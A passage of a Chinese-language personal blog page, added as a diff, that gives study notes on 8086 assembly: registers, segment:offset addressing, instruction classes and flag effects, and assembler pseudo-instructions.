@@ -1,0 +1,1229 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=dark>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.jpg">
+  <link rel="icon" href="/img/avatar.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="D4wn">
+  <meta name="keywords" content="后端,博客,网络安全,爬虫,D4wn,d4wnnn,脚本,Selenium,计算机网络,操作系统">
+  
+    <meta name="description" content="Assembly 前置知识  寄存器:CPU中可以存储数据的器件 汇编语言由以下三类组成  汇编指令 伪指令(即指示性语句) 其他符号  在内存或者磁盘上 数据和指令地位相同 数据总线的宽度决定了CPU和外界的数据传输速度. cpu内部总线实现cpu内部各个器件之间的联系 cpu外部总线实现cpu和主板上其他器件的联系 编译器的作用：将汇编指令转换为机器码 汇编语言发">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Assembly">
+<meta property="og:url" content="https://d4wnnn.github.io/2022/10/11/Security/Assembly/index.html">
+<meta property="og:site_name" content="D4wn">
+<meta property="og:description" content="Assembly 前置知识  寄存器:CPU中可以存储数据的器件 汇编语言由以下三类组成  汇编指令 伪指令(即指示性语句) 其他符号  在内存或者磁盘上 数据和指令地位相同 数据总线的宽度决定了CPU和外界的数据传输速度. cpu内部总线实现cpu内部各个器件之间的联系 cpu外部总线实现cpu和主板上其他器件的联系 编译器的作用：将汇编指令转换为机器码 汇编语言发">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://d4wnnn.github.io/img/article_img_2.jpg">
+<meta property="article:published_time" content="2022-10-11T13:32:04.000Z">
+<meta property="article:modified_time" content="2024-05-07T19:49:11.054Z">
+<meta property="article:author" content="D4wn">
+<meta property="article:tag" content="汇编">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://d4wnnn.github.io/img/article_img_2.jpg">
+  
+  
+  
+  <title>Assembly - D4wn</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/shubiao.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"d4wnnn.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":false,"baidu":"104d1c240fe4777ab966bd68252f7714","google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?104d1c240fe4777ab966bd68252f7714";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"><style>mjx-container[jax="SVG"] {
+  direction: ltr;
+}
+
+mjx-container[jax="SVG"] > svg {
+  overflow: visible;
+}
+
+mjx-container[jax="SVG"][display="true"] {
+  display: block;
+  text-align: center;
+  margin: 1em 0;
+}
+
+mjx-container[jax="SVG"][justify="left"] {
+  text-align: left;
+}
+
+mjx-container[jax="SVG"][justify="right"] {
+  text-align: right;
+}
+
+g[data-mml-node="merror"] > g {
+  fill: red;
+  stroke: red;
+}
+
+g[data-mml-node="merror"] > rect[data-background] {
+  fill: yellow;
+  stroke: none;
+}
+
+g[data-mml-node="mtable"] > line[data-line] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > rect[data-frame] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > .mjx-dashed {
+  stroke-dasharray: 140;
+}
+
+g[data-mml-node="mtable"] > .mjx-dotted {
+  stroke-linecap: round;
+  stroke-dasharray: 0,140;
+}
+
+g[data-mml-node="mtable"] > svg {
+  overflow: visible;
+}
+
+[jax="SVG"] mjx-tool {
+  display: inline-block;
+  position: relative;
+  width: 0;
+  height: 0;
+}
+
+[jax="SVG"] mjx-tool > mjx-tip {
+  position: absolute;
+  top: 0;
+  left: 0;
+}
+
+mjx-tool > mjx-tip {
+  display: inline-block;
+  padding: .2em;
+  border: 1px solid #888;
+  font-size: 70%;
+  background-color: #F8F8F8;
+  color: black;
+  box-shadow: 2px 2px 5px #AAAAAA;
+}
+
+g[data-mml-node="maction"][data-toggle] {
+  cursor: pointer;
+}
+
+mjx-status {
+  display: block;
+  position: fixed;
+  left: 1em;
+  bottom: 1em;
+  min-width: 25%;
+  padding: .2em .4em;
+  border: 1px solid #888;
+  font-size: 90%;
+  background-color: #F8F8F8;
+  color: black;
+}
+
+foreignObject[data-mjx-xml] {
+  font-family: initial;
+  line-height: normal;
+  overflow: visible;
+}
+
+.MathJax path {
+  stroke-width: 3;
+}
+
+mjx-container[display="true"] {
+  overflow: auto hidden;
+}
+
+mjx-container[display="true"] + br {
+  display: none;
+}
+</style></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>D4wn</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/total.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Assembly"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        D4wn
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-10-11 21:32" pubdate>
+          2022年10月11日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          34 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Assembly</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="assembly">Assembly</h1>
+<h2 id="前置知识">前置知识</h2>
+<ol type="1">
+<li><p>寄存器:CPU中可以存储数据的器件</p></li>
+<li><p>汇编语言由以下三类组成</p>
+<ol type="1">
+<li><p>汇编指令</p></li>
+<li><p>伪指令(即指示性语句)</p></li>
+<li><p>其他符号</p></li>
+</ol></li>
+<li><p>在内存或者磁盘上 数据和指令地位相同</p></li>
+<li><p>数据总线的宽度决定了CPU和外界的数据传输速度.</p></li>
+<li><p>cpu内部总线实现cpu内部各个器件之间的联系</p></li>
+<li><p>cpu外部总线实现cpu和主板上其他器件的联系</p></li>
+<li><p>编译器的作用：将汇编指令转换为机器码</p></li>
+<li><p>汇编语言发展至今，有3类指令</p>
+<ul>
+<li>汇编指令，比如mov</li>
+<li>伪指令，没有对应的机器码，只是给编译器看的</li>
+<li>其他符号，比如+-*/,也没有机器码，只是给编译器看的</li>
+</ul>
+<p>对于CPU来讲，系统中所有存储器的存储单元都处于一个统一的逻辑存储器中，比如包含显存，主板的ROM等等。</p></li>
+</ol>
+<h2 id="寄存器">寄存器</h2>
+<p>8086CPU共有14个寄存器</p>
+<p>8086CPU所有的寄存器都是16位的,可以存放两个字节</p>
+<p>一个字为两个字节</p>
+<p>8086上一代CPU中的寄存器都是8位,为了兼容性,AX,BX,CX,DX都可当做独立的两个寄存器使用.</p>
+<h3 id="通用寄存器8个">通用寄存器8个</h3>
+<ol type="1">
+<li><p>AX,BX,CD,DX通常存放一般数据,被称为通用寄存器</p></li>
+<li><p>AX可分为第八位AL和高八位AH</p></li>
+<li><p>汇编指令不区分大小写</p></li>
+</ol>
+<figure>
+<img src="/2022/10/11/Security/Assembly/image-20221011221502722.png" srcset="/img/loading.gif" lazyload alt="image-20221011221502722">
+<figcaption aria-hidden="true">image-20221011221502722</figcaption>
+</figure>
+<ol start="4" type="1">
+<li><p>16位CPU有以下特征</p>
+<ol type="1">
+<li>运算器一次可以处理16位数据</li>
+<li>寄存器的最大宽度为16位</li>
+<li>寄存器和运算器之间的通路为16位</li>
+</ol></li>
+<li><p>8086有20位地址总线.8086内部为16位结构,只能传送16位数据,那么如何合成20位数据?</p>
+<figure>
+<img src="/2022/10/11/Security/Assembly/image-20221011223244003.png" srcset="/img/loading.gif" lazyload alt="image-20221011223244003">
+<figcaption aria-hidden="true">image-20221011223244003</figcaption>
+</figure></li>
+<li><p>地址加法器合成物理地址的方法:</p>
+<p>物理地址=段地址*16+偏移地址</p></li>
+</ol>
+<h2 id="段的概念">段的概念</h2>
+<p>以后在编程需要时,可以将若干地址连续的内存单元看作一个段.</p>
+<p>注意,由于段地址*16必然是16的倍数,所以一个段的起始地址一定是16的倍数</p>
+<p>由于偏移地址为16位,16位的寻址能力为64k,所以一个段的长度最大为64k</p>
+<p>cpu可以用不同的段地址和偏移地址形成用一个物理地址</p>
+<p>8086给出物理地址的方法：</p>
+<p><img src="/2022/10/11/Security/Assembly/image-20231123205839082.png" srcset="/img/loading.gif" lazyload alt="image-20231123205839082" style="zoom:50%;"></p>
+<p>如图，段地址与偏移地址均为16位，后经过地址加法器转换为20位的物理地址。</p>
+<p>物理地址=段地址*16+偏移地址，更一般的说，是物理地址=基础地址+偏移地址</p>
+<h2 id="段寄存器">段寄存器</h2>
+<p>段寄存器就是提供段地址的;</p>
+<p>8086有4个段寄存器:</p>
+<ul>
+<li><p>CS:代码段寄存器,存放内存代码段区域的入口地址</p></li>
+<li><p>DS:数据段寄存器</p>
+<p>当<code>mov 寄存器,内存数据</code>时，8086CPU自动读取DS中的数据作为内存单元的段地址</p></li>
+<li><p>SS:堆栈段寄存器</p></li>
+<li><p>ES:附加段寄存器</p></li>
+</ul>
+<p>当8086CPU要访问内存时,由这四个段寄存器提供内存单元的段地址</p>
+<p>CS和IP是8086cpu中最关键的寄存器,他们指示了cpu当前要读取指令的地址</p>
+<p>ip为指令指针寄存器</p>
+<p>cpu刚开始工作时,cs和ip被设置为cs=FFFFH,ip=0000H;</p>
+<p>如果说,内存中的一段信息曾经被cpu执行过的话,那么他所在的内存单元必然被cs:ip指向过</p>
+<p>mov指令不能用于设置cs ip的值</p>
+<p>同时修改cs ip中的内容:</p>
+<p><code>jmp 2AE3:3</code></p>
+<p>若只修改ip内容:</p>
+<p><code>jmp ax</code></p>
+<p>代码段:</p>
+<p>cpu只认被cs:ip指向的内存单元中的内容为指令</p>
+<p>注意：8086CPU并不支持将数据直接送入段寄存器(硬件方面的设计缺陷)，必须用寄存器中转，例如</p>
+<p><code>mov ds,1000h</code>非法，比如用其它寄存器中转,即<code>mov ax,1000h;mov ds,ax</code></p>
+<h2 id="寄存器内存访问">寄存器(内存访问)</h2>
+<ol type="1">
+<li><p>任何两个地址连续的内存单元,N号单元和N+1号单元,可以将他们看做两个内存单元,也可以看做一个地址为N的字单元中的高位字节单元和低位字节单元.</p></li>
+<li><p>已知的mov指令可以完成两种传送过程:</p>
+<ol type="1">
+<li>将数据直接送进寄存器</li>
+<li>将一个寄存器中的内容送入另一个寄存器中</li>
+<li>将一个字节单元中的内容送入一个寄存器:<code>mov al [偏移地址]</code>会自动取DS中的数据作为偏移地址</li>
+<li>8086cpu不支持将数据直接送入段寄存器的操作</li>
+</ol></li>
+<li><p>mov,add,sub指令</p></li>
+<li><p>这一章以8086CPU为基础，8086CPU的所有寄存器都是16位的。</p></li>
+</ol>
+<h2 id="数据传送类指令">数据传送类指令</h2>
+<p>任何传送类指令不影响标志位</p>
+<h3 id="通用数据传送指令">通用数据传送指令</h3>
+<ul>
+<li><p>一般数据传送指令MOV</p>
+<p><code>MOV AX 09H是可以的</code></p></li>
+<li><p>堆栈操作指令PUSH POP</p>
+<p>一次的操作是两个字节</p></li>
+<li><p>交换指令XCHG</p>
+<p>操作数不能两个同时是存储器操作数</p>
+<p>段寄存器不能是操作数</p></li>
+<li><p>查表转换指令XLAT</p>
+<p>采用隐含寻址</p>
+<p>[BX+AL]-&gt;AL</p></li>
+<li><p>字位拓展指令CBW CWD</p>
+<p>永远当做有符号数进行拓展</p>
+<p>采用隐含寻址</p>
+<p>若AL最高位为1，执行CBW后AH为0FFH</p>
+<p>若AL最高位为0，则执行CBW后AH为00H</p>
+<p>CWD将AX的符号位拓展到DX</p></li>
+</ul>
+<h3 id="输入输出指令in-out">输入输出指令IN OUT</h3>
+<p>若端口号大于FFH，则端口号必须由DX寄存器指定</p>
+<p>IN ACC PORT，这里ACC为AL或者AX，若为16位，则是AX，若8位，则为AL</p>
+<h3 id="目标地址传送指令lea-lds-les">目标地址传送指令LEA LDS LES</h3>
+<p>对于LEA，原操作数必为存储器操作数，且目标操作数必须为16位通用寄存器</p>
+<p>LDS Reg16
+Mem32，读取的是数，不是地址，高16位放在DS，低16位放在指定寄存器</p>
+<h3 id="标志传送指令lahf-sahf-pushf-popf">标志传送指令LAHF SAHF PUSHF
+POPF</h3>
+<p>标志寄存器：OF DF SF符号标志位(负数时为1) ZF为0位 AF辅助进位位
+PF奇偶位(低8位1的个数为偶数时为1) CF</p>
+<p>对于LAHF，把标志寄存器的低8位放在AH，SAHF则相反</p>
+<p>注意，这里的奇偶校验位是校验的低八位</p>
+<p>如何判断溢出？有三种思路</p>
+<p>第一种是正+正=负 负+负=正</p>
+<p>第二种是最高有效位和符号位进位异或为1</p>
+<p>第三种是双符号位，若不同则溢出</p>
+<h2 id="算数运算类指令">算数运算类指令</h2>
+<p>算数运算类指令，对于加法和减法，除了自增自减不影响CF外，其余均影响CF</p>
+<p>对于乘除法，只记乘法即可，除法对标志位均无影响</p>
+<h3 id="加法add-adc-inc">加法ADD ADC INC</h3>
+<h3 id="减法sub-sbb-dec-neg-cmp">减法SUB SBB DEC NEG CMP</h3>
+<p>对于NEG，只有操作数为0时，进位标志CF被置0，其余情况均有借位</p>
+<p>已知x求-x的补码？ 连同符号位全部变反，然后末尾加1 0000 0010 2的补码
+1111 1110 (-2)补码 加起来为0</p>
+<p>当字节操作数为80H或者8000H时，结果将无变化，但是溢出标志OF置为1</p>
+<p>注意，JE和JZ是一样的，JNE和JNZ是一样的</p>
+<p>JP和JPE是一样的，JNP和JPO是一样的</p>
+<p>对于CMP A,B</p>
+<p>若为无符号数，</p>
+<ul>
+<li>A&gt;B JA JNBE</li>
+<li>A&lt;B JB JNAE</li>
+<li>A&gt;=B JAE JNB</li>
+<li>A&lt;=B JBE JNA</li>
+</ul>
+<p>若为有符号数</p>
+<ul>
+<li>A&gt;B JG JNLE</li>
+<li>A&lt;B JL JNGE</li>
+<li>A&gt;=B JGE JNL</li>
+<li>A&lt;=B JBE JNA</li>
+</ul>
+<p>如何比较AB的大小？</p>
+<p>若为无符号数 是比较好判断的 首先是ZF若为1
+则A=B，若ZF为0，CF为1，则A&lt;B，否则A&gt;B</p>
+<p>若为有符号数，则比较复杂，SF异或OF为0且ZF为0时，A&gt;B</p>
+<p>SF异或OF为1且ZF为0时，A&lt;B</p>
+<h3 id="乘法mul-imul">乘法MUL IMUL</h3>
+<p>若两个数都是8位，则其中一个默认在<code>al</code>中，结果存放在<code>ax</code></p>
+<p>若两个数都是16位，则其中一个默认在<code>ax</code>中,结果存放在<code>dx</code>,<code>ax</code></p>
+<p>MUL对CF和OF的标志位产生有效影响，但是其他标志位不确定</p>
+<p>注意！！！若结果的高半部分为全0，则CF=OF=0，否则为1</p>
+<p>什么是IMUL？</p>
+<p>IMUL是有符号数的乘法，对标志位的影响类似MUL，唯一的区别是当高半部分是低半部分的符号拓展时CF=OF=0，否则为1</p>
+<h3 id="除法div-idiv">除法DIV IDIV</h3>
+<p>除法对标志位均无影响</p>
+<p>除法要求被除数的字长是除数字长的两倍</p>
+<p>采用隐含寻址，被除数可以是AX或者DX+AX</p>
+<p>若除数为8位，<code>ax / 除数 = al ... ah</code></p>
+<p>若除数为16位，<code>dx,ax / 除数 = ax ... dx</code></p>
+<h2 id="逻辑运算">逻辑运算</h2>
+<h3 id="逻辑与and">逻辑与AND</h3>
+<p>主要应用：让某一位清零</p>
+<p>会影响六个标志位，但是CF和OF始终为0</p>
+<h3 id="逻辑或or">逻辑或OR</h3>
+<p>会影响六个标志位，但是CF和OF始终为0</p>
+<p>主要应用：让某一位变成1</p>
+<h3 id="逻辑非not">逻辑非NOT</h3>
+<p>对所有标志位均无影响</p>
+<h3 id="异或xor">异或XOR</h3>
+<p>让某些位取反</p>
+<p>会影响六个标志位，但是CF和OF始终为0</p>
+<h3 id="测试指令test">测试指令TEST</h3>
+<p>两操作数按位与，但是结果不送回目的操作数</p>
+<p>会影响六个标志位，但是CF和OF始终为0</p>
+<h2 id="移位指令">移位指令</h2>
+<p>任何移位 出来的永远是到CF</p>
+<h3 id="非循环移位">非循环移位</h3>
+<h4 id="算数移位sal-sar">算数移位SAL SAR</h4>
+<p>SAL OPRD CL，当移1位时，CL可以为1，否则必须是CL</p>
+<p>若移位后操作数的最高位和CF不同，则OF=1，溢出</p>
+<p>左移补的是0 右移补的是CF</p>
+<h4 id="逻辑移位shl-shr">逻辑移位SHL SHR</h4>
+<p>和算术移位类似，但是OF=1不代表溢出</p>
+<p>左移和右移补的是0</p>
+<h3 id="循环移位">循环移位</h3>
+<h4 id="带cf-rcl-rcr">带CF RCL RCR</h4>
+<h4 id="不带cf-rol-ror">不带CF ROL ROR</h4>
+<h2 id="串操作指令">串操作指令</h2>
+<p>源串DS：SI，其中DS可改为SS ES</p>
+<p>目的串：ES：DI，都不可更改</p>
+<p>若DF=0时 按照自增方式，DF=1，按照自减方式</p>
+<p>重复前缀不影响标志位</p>
+<p>传操作指令时8086指令系统中唯一源操作数和目的操作数都为存储器操作数</p>
+<p>重复前缀由REP REPZ REPNZ</p>
+<p>串操作指令可能影响标志位</p>
+<h3 id="串传送movsb-movsw">串传送MOVSB MOVSW</h3>
+<h3 id="串比较cmpsb-cmpsw">串比较CMPSB CMPSW</h3>
+<p>串比较指令影响标志位</p>
+<h3 id="串扫描scasb-scasw">串扫描SCASB SCASW</h3>
+<p>串扫描指令影响标志位</p>
+<h3 id="串装入lodsb-lodsw">串装入LODSB LODSW</h3>
+<h3 id="串存储stosb-stosw">串存储STOSB STOSW</h3>
+<h2 id="程序控制指令">程序控制指令</h2>
+<h3 id="无条件转移">无条件转移</h3>
+<p>影响标志位</p>
+<p>无条件转移分为段间转移和段内转移，段内转移分为段内短转移和段内近转移，</p>
+<p>段间转移：jmp far ptr 标号，又称为远转移</p>
+<p>段内短转移：jmp short 标号</p>
+<p>段内近转移：jmp near ptr 标号</p>
+<p>段内转移还可以是jmp word ptr 内存单元地址</p>
+<p>段间转移还可以是jmp dword ptr 内存单元地址</p>
+<h3 id="条件转移">条件转移</h3>
+<p>影响标志位</p>
+<p>采用直接寻址方式的短转移，即只能以当前IP为中心的-128-127字节</p>
+<h3 id="循环控制指令loop-loopz-loope-loopnp-loopne">循环控制指令LOOP
+LOOPZ LOOPE LOOPNP LOOPNE</h3>
+<p>所有的循环指令都是短转移</p>
+<p>也是以当前IP为中心的-128-127字节</p>
+<h3 id="子程序调用和返回">子程序调用和返回</h3>
+<p>中断向量的高16位作为CS 低16位作为IP</p>
+<p>call不能实现短转移</p>
+<p>call 标号相当于push ip，jmp near ptr 标号</p>
+<p>call far ptr 标号实现的是段间转移</p>
+<h3 id="中断类型指令int-iret">中断类型指令INT IRET</h3>
+<p>对于INT</p>
+<p>和调用子程序不同，这里需要改变标志位</p>
+<p>首先是把IF置为0，TF置为0</p>
+<p>然后压栈CS 压栈IP</p>
+<p>然后得到中断服务程序的入口地址</p>
+<p>对于IRET</p>
+<p>中断返回指令位于中断服务子程序的最后一条，用于返回被中断的程序</p>
+<p>和RET不用：除了返回 还要返回标志寄存器</p>
+<h2 id="处理器控制指令">处理器控制指令</h2>
+<p>CLC CLD CLI STI STD STC CMC</p>
+<h2 id="汇编语言程序设计">汇编语言程序设计</h2>
+<figure>
+<img src="/2022/10/11/Security/Assembly/image-20221228140630749.png" srcset="/img/loading.gif" lazyload alt="image-20221228140630749">
+<figcaption aria-hidden="true">image-20221228140630749</figcaption>
+</figure>
+<h3 id="标号">标号</h3>
+<p>标号可以看做指令地址的别名</p>
+<h3 id="变量">变量</h3>
+<p>在指令性语句中直接引用变量名代表一个数</p>
+<p>当变量出现在寄存器间接寻址的操作数中表示该变量的偏移地址</p>
+<p>在指示性语句中代表一个偏移地址</p>
+<p>ADR3 DD NUM中低16位存偏移地址 高16位存段地址</p>
+<h3 id="表达式">表达式</h3>
+<p>任何表达式的值在程序被汇编的过程中计算确定 而不是到程序运行时计算</p>
+<h3 id="伪指令">伪指令</h3>
+<p>操作数的值不能超过伪指令所定义的范围</p>
+<p>STRING1 DB 'ABCDEFG';正确</p>
+<p>STRING2 DW 'AB','CD';</p>
+<p>DW/DD不允许2个以上字符</p>
+<h3 id="属性定义伪指令">属性定义伪指令</h3>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">SUB1 LABEL</span> <span class="hljs-built_in">FAR</span><br><span class="hljs-symbol">SUB2:</span> <span class="hljs-keyword">MOV</span> <span class="hljs-built_in">AX</span>,<span class="hljs-number">30H</span><br></code></pre></td></tr></table></figure>
+<p>SUB1和SUB2入口地址相同</p>
+<h3 id="表达式运算符">表达式运算符</h3>
+<p>算术运算符 +-*/ mod</p>
+<p>逻辑运算符 and or not xor</p>
+<p>关系运算符eq等于 ne不等于 lt小于 le小于等于 gt大于 gr大于等于</p>
+<p>若比较常量 则按照无符号数比较</p>
+<p>若比较变量 则比较偏移地址</p>
+<p>取值运算符 OFFSET</p>
+<p>属性运算符 PTR</p>
+<p>TYPE运算符 取变量或者标号的类型属性 NEAR-1 FAR-2 BYTE1 WORD2 DWORD4
+QWORD8 TQWORD10</p>
+<p>LENGTH运算符 若无DUP则为1 若有DUP则按照DUP取值</p>
+<p>SIZE只能用于变量 取值为LENGTH和TYPE的乘积</p>
+<p>HIGH/LOW运算符</p>
+<p>取高字节和低字节</p>
+<h3 id="符号定义伪指令">符号定义伪指令</h3>
+<p><code>count equ 5</code></p>
+<h3 id="段定义伪指令">段定义伪指令</h3>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs">段名 SEGMEMT 定位类型<br><br><br>段名 ENDS<br></code></pre></td></tr></table></figure>
+<p>定位类型有四种</p>
+<p>对于PARA和PAGE类型，起始地址一定是0</p>
+<ul>
+<li><p>PAGE 页型</p>
+<p>一个页面256个字节</p>
+<p>表示该段从一个页面的边界开始存放数据</p>
+<p>且段地址一定以00H结尾</p></li>
+<li><p>PARA 小节型(默认值)</p>
+<p>且地址一定是以0H结尾</p></li>
+<li><p>WORD 字型</p>
+<p>起始地址00B结尾</p></li>
+<li><p>BYTE 字节型</p>
+<p>起始地址任意</p></li>
+</ul>
+<p>组合类型定义段与段之间的关系</p>
+<ul>
+<li><p>NONE</p>
+<p>这个是默认情况 即使具有相同的段名 也分别放入内存</p></li>
+<li><p>PUBLIC</p>
+<p>相同名字的段会放在一起</p></li>
+<li><p>STACK</p>
+<p>这个比较重要</p></li>
+<li><p>COMMON</p>
+<p>保留最长的</p></li>
+<li><p>MEMORY</p>
+<p>表示本段在存储器应定位在其它所有段之后的最高地址上</p></li>
+<li><p>AT</p>
+<p>根据表达式的值确定段地址</p></li>
+</ul>
+<p>先按照组合类型进行组合，优先级比较高，然后按照类别名进行组合，优先级比较低</p>
+<h3 id="设置段寄存器伪指令">设置段寄存器伪指令</h3>
+<p>CS段不用初始化</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">AX</span>,DATA1；段名就表示段地址<br>或者可以这么写：<br><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">AX</span>,<span class="hljs-built_in">SEG</span> DATA1<br><span class="hljs-comment">;下面表示容量</span><br><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">AX</span>,OFFSET DATA1<br></code></pre></td></tr></table></figure>
